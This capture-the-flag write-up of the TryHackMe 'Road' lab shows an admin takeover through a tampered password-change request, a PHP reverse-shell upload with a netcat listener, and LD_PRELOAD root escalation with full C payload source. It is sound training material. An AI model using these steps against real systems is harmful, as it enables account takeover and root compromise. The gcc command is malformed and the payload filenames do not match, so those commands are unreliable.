*[Image: Road CTF Cover Image]*
# Road CTF Writeup (Medium)

## NMAP Scan
```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-01 22:53 GMT
Nmap scan report for 10.10.84.237
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 6bea185d8dc79e9a012cdd50c5f8c805 (ECDSA)
|_  256 ef06d7e4b165156e9462ccddf08a1a24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sky Couriers
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
From the NMAP scan, I saw that an Apache webserver was running on port 80. Browsing to the website, I see a page for a company named `Sky Couriers`. I poked around the webpage a bit but nothing seemed too interesting, so I decided to run a Gobuster scan.

## Gobuster Scan
```
/assets
/career.html
/index.html
/phpMyAdmin
/server-status
/v2
```
Seeing **/v2** really peaked my interest. So I browsed to **/v2** and got instantly redirected to a login page. I tested a few random credentials like `admin:admin` and `admin:password` but to no avail. There was an option to create an account, so I did, using the credentials `test@test.com:test`. 

Now I was logged into the website, I was presented with a dashboard. I searched around the dashboard for a while, looking for any upload forms or input fields that I could test for vulnerabilities, and I came across a page where I could edit my profile. Within that page, there was an upload form where I could upload a profile picture. However, it was blocked, saying that only the user **admin** can upload profile pictures, along with the email address for the admin user `admin@sky.thm`.

I search around the website a bit more, until I come across a feature that allows me to change my password for my account. This gave me an idea, what if I can exploit this feature to change the password for the admin user?

I load up BurpSuite, choose the option to intercept requests, and go back to the website to change the password for my account. When the request is intercepted, I see two parameters in the body of the POST request. One for the email of the account that the password is being changed for, and one for the new password. So, I change the email to the admin user's email `admin@sky.thm` and forward the request. I get a response of 200... it seems to have worked!

I logged out of my account and log back in to the admin's account using the new password I set for the account which happened to be **12345**.

## Foothold
Now I had access to the admin's account on the website, that also meant I had access to the feature to upload a profile picture! I decided to try upload a PHP reverse shell.

I like the use this one made by `pententmonkey` on GitHub. You can find it [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

Just remember to change the IP and Port, in the reverse shell, to your listener's IP and Port.

I then started a listener: `nc -nvlp 4444`

Uploading the PHP reverse shell as the profile picture seemed to work, It uploaded successfully but when I tried to view the profile picture to activate the reverse shell, it did not work. I tried uploading the reverse shell again but intercepted the request in BurpSuite this time to see what was happening. Looking through the reponse, I noticed a comment from one of the developers saying:
`[<-- /v2/profileimages -->]`

So, of course, I browsed to **/v2/profileimages/revshell.php** and success! I got a connection back on my listener!

Stabilizing the shell using `python3 -c 'import pty;pty.spawn("/bin/bash")'` I can see I have a shell on the machine as **www-data**. Changing directory to **/home** I see another directory of **webdeveloper**. So I change directory, again, into **/home/webdeveloper** and see a file named `user.txt` which was the first flag needed for the CTF.

## Privilege Escalation (webdeveloper)
Running `ls -lah` in the **/home/webdeveloper** directory, I see a hidden file named `.sudo_as_admin_successful`, telling me that the user **webdeveloper** is in the sudoers group. But nothing else of interest really, so I download `LinPeas` from my local machine into **/tmp** and run it. It pulls back some pretty useful information including some information about MongoDB.

MongoDB has a feature allowing anonymous login, so I try it and it works! Enumerating databases and tables, I come across a plaintext password for the user **webdeveloper**...

I log in as **webdeveloper** using: `su webdeveloper` and entering the password, Success! Now it's time to become root...

## Privilege Escalation (root)
Running `sudo -l` as the user **webdeveloper** I can see that I can run the program `/usr/bin/sky_backup_utility` and also have access to the `LD_PRELOAD` environment variable, interesting...

I then run `strings` on the `sky_backup_utility` to see if I can see what the program does, and I see that it creates a backup of everything in **/var/www/html** and stores it in **/root/.backup**, using the `tar` program.

I can exploit `tar`, using the `LD_PRELOAD` environment variable, to load my own malicious shared library to run whatever commands I want

- I created a payload file that should spawn a shell for me when it is run:
  ```
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>
  
  void payload()__attribute__((constructor));
  
  void payload() {
  	unsetenv("LD_PRELOAD");
  	setuid(0);
  	setgid(0);
  	system("/bin/bash");
  }
  ```
- Saved the file as **payload.c**
- Compiled the payload into a shared object using: `gcc -fPIC shared -o payload.so payload.c`

Finally, I run the command `sudo LD_PRELOAD=exploit.so /usr/bin/sky_backup_utility` and SUCCESS! It spawns a root shell for me!

I change directory to **/root** and see the final flag needed for the CTF!

TryHackMe Road CTF: [https://tryhackme.com/room/road](https://tryhackme.com/room/road)
